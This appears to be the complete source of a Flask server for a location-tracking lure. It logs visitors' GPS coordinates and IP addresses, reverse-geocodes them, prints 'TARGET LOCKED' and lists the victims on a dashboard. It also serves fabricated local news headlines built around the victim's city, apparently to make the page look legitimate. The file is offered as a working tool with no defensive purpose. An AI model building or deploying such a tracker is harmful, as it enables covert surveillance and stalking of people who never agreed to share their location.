from flask import Flask, render_template, request, jsonify
from datetime import datetime
import json
from urllib.request import urlopen, Request

app = Flask(__name__)

# --- MEMORY STORAGE ---
captured_data = []


def get_city_name(lat, lon):
    try:
        url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lon}"
        req = Request(url, headers={'User-Agent': 'SecurityDashboard/1.0'})
        with urlopen(req) as response:
            data = json.loads(response.read())
            address = data.get('address', {})
            return address.get('city') or address.get('town') or address.get('village') or address.get(
                'county') or "Unknown Location"
    except:
        return "Unknown Location"


def get_real_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0]
    return request.remote_addr


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/dashboard')
def dashboard():
    return render_template('dashboard.html', data=reversed(captured_data))


@app.route('/get_location', methods=['POST'])
def get_location():
    data = request.get_json()
    lat = data.get('latitude')
    lon = data.get('longitude')
    ip_address = get_real_ip()
    timestamp = datetime.now().strftime("%H:%M:%S")
    city = get_city_name(lat, lon)

    print(f"[+] TARGET LOCKED: {city} ({lat}, {lon}) - IP: {ip_address}")

    new_entry = {
        'id': len(captured_data) + 1,
        'ip': ip_address,
        'city': city,
        'lat': lat, 'lon': lon,
        'time': timestamp
    }
    captured_data.append(new_entry)
    return jsonify({"status": "success", "city": city})


@app.route('/get_news', methods=['POST'])
def get_news():
    data = request.get_json()
    city = data.get('city') or "Odisha"

    news_feed = [
        f"Khordha Road-Bolangir rail line near {city} to be fully operational by 2026 end: ECoR",
        f"Cabinet approves construction of 6-Lane Access-Controlled Ring Road in {city}",
        f"Govt announces new 'Krushak Assistance' scheme for farmers in {city} district",
        f"{city} Metro Rail project gains momentum, soil testing begins near central station",
        f"Heavy traffic reported on National Highway connecting {city} to Bhubaneswar"
    ]
    return jsonify({"news": news_feed})


if __name__ == '__main__':
    app.run(debug=True, port=5000)